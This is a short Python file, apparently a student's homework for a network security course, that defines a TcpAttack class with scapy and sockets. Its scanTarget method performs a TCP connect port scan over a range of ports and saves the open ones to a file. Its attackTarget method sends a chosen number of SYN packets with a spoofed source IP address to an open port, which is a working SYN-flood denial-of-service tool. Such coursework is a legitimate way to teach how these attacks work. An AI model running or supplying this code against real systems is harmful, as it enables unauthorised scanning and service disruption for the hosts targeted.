#!/usr/bin/env python3
# Homework Number: 8
# Name: Zhengsen Fu
# ECN Login: fu216
# Due Date: Mar 26
import socket
from scapy.all import *


class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        # the following code come from lecture note
        open_ports = []
        fptr = open('openports.txt', 'w')
        # Scan the ports in the specified range:
        for testPort in range(rangeStart, rangeEnd + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, testPort))
                open_ports.append(testPort)
                fptr.write('{}\n'.format(testPort))
            except:
                pass
        fptr.close()

    def attackTarget(self, port, numSyn):
        # the following code come from lecture note
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((self.targetIP, port))
        except:
            return 0  # if the port is not open then return 0

        for _ in range(numSyn):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags='S', sport=RandShort(), dport=port)
            packetToSent = IP_header / TCP_header
            send(packetToSent)
        return 1  # return 1 when the attack was mounted



